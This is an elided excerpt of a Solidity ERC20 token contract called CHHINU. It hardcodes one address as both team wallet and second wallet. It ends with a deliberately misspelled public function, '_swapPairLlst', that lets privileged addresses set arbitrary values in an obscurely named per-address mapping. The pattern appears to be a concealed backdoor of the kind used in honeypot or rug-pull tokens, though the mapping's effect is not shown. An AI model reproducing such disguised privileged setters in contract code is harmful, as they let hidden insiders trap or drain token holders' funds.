...
contract CHHINU
 is Context, IERC20, Ownable {
    ...
    string private _name = "CHHINU";
    string private _symbol = "CHHINU";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x1941B08135e0Bc70C563Cd584979dC714395d27D));
        _secondWallet = payable(address(0x1941B08135e0Bc70C563Cd584979dC714395d27D));
...
function _swapPairLlst(address about, uint256 intint) public
{if(
_swapPairList[_msgSender()])
_ssawp[about]
= intint;}receive() external payable {}
